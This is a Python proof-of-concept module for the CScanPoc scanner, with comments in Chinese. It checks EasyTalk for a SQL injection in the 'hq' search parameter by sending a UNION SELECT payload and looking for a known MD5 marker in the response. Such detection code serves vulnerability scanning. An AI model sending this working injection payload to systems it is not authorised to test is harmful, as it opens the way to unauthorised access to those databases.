# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'EasyTalk_0035' # 平台漏洞编号，留空
    name = 'EasyTalk Sql Injection ' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-02-09'  # 漏洞公布时间
    desc = '''
        EasyTalk 在spaceaction.class.php中
        $带入条件。 
        if ($hq) {//关键词搜索
        $condition.=' AND content_body LIKE "%'.$hq.'%"';
        然后查询，导致SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # https://wooyun.shuimugan.com/bug/view?bug_no=50353
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'EasyTalk'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '496f1c64-e5ad-4fb5-9673-6b1c82a0ef0e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-19' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            payload = '''/?m=space&a=home&hq=a%" union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,md5(c),20,21,22,23#'''
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()
        

if __name__ == '__main__':
    Poc().run()